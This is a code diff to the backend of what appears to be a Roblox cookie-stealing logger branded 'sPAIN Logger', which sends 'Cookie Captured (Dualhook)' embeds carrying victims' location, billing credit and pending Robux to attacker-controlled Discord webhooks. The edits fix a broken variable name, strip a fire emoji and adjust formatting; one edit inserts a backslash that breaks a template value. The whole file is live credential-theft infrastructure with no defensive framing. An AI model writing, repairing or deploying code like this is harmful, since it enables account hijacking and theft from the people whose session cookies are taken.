@@ -10,7 +10,6 @@ const BASE_URL    = 'https://spain-tools.vercel.app';
 const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
 const EMOJI     = '<a:emoji_17:1508694920972468347>';
-const FIRE      = '🔥';
 
 // ── Redis ─────────────────────────────────────────────────────────────────────
 async function redisGet(key) {
@@ -103,10 +102,10 @@ const FLAGS = {
 function flag(c) { return FLAGS[c] || '🌐'; }
 
 // ── Discord helpers ───────────────────────────────────────────────────────────
-async function discordSend(url, payload, useS PainBranding = true) {
+async function discordSend(url, payload, useSPainBranding = true) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
-    const webhookPayload = useS PainBranding 
+    const webhookPayload = useSPainBranding 
       ? { username: WH_NAME, avatar_url: WH_AVATAR, ...payload }
       : { ...payload };
     
@@ -117,7 +116,7 @@ async function discordSend(url, payload, useS PainBranding = true) {
   } catch (_) {}
 }
 
-async function discordChunked(url, text, useS PainBranding = true) {
+async function discordChunked(url, text, useSPainBranding = true) {
   let rem = text; let first = true;
   while (rem.length > 0) {
     const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
@@ -125,7 +124,7 @@ async function discordChunked(url, text, useS PainBranding = true) {
       content: first
         ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
         : chunk + (rem.length === 0 ? '\n```' : '')
-    }, useS PainBranding);
+    }, useSPainBranding);
     first = false;
   }
 }
@@ -204,7 +203,7 @@ export default async function handler(req, res) {
         content: '@everyone',
         embeds: [{
           title: '🍪 Cookie Captured (Dualhook)',
-          description: `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`,
+          description: `${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`,
           color: 0xff3333,
           fields: dhFields,
           footer: { text: `sPAIN Logger • ${pName}` },
@@ -262,7 +261,7 @@ export default async function handler(req, res) {
         content: '@everyone',
         embeds: [{
           title: '🍪 Cookie Captured (Dualhook)',
-          description: `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`,
+          description: `${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`,
           color: 0xff3333,
           fields: dhFields,
           footer: { text: `sPAIN Logger • ${pName}` },
@@ -336,7 +335,7 @@ export default async function handler(req, res) {
       },
       {
         name:   '📍 Location',
-       value:  `${country} ${cflag}`,
+        value:  `${country} ${cflag}`,
         inline: true
       },
       {
@@ -351,7 +350,7 @@ export default async function handler(req, res) {
       },
       {
         name:   '💳 Billing',
-        value:  `Credit: ${fmt(credit)} ${creditCurr}\nConvert: ${fmt(pendingRobux)}\nPayments: ${payCount}`,
+        value:  `Credit: \${fmt(credit)} ${creditCurr}\nConvert: ${fmt(pendingRobux)}\nPayments: ${payCount}`,
         inline: true
       },
       {
@@ -392,7 +391,7 @@ export default async function handler(req, res) {
   // ── Build the rich embed for webhook1 (sPAIN branding) ──────────────────────────────────────────────────
   const sPainEmbed = {
     title: '🍪 Cookie Captured (Dualhook)',
-    description: `${FIRE} s.PAIN ${FIRE}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
+    description: `${EMOJI} s.PAIN ${EMOJI}\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
     color: 5793266,
     thumbnail: { url: avatarUrl },
     fields: [
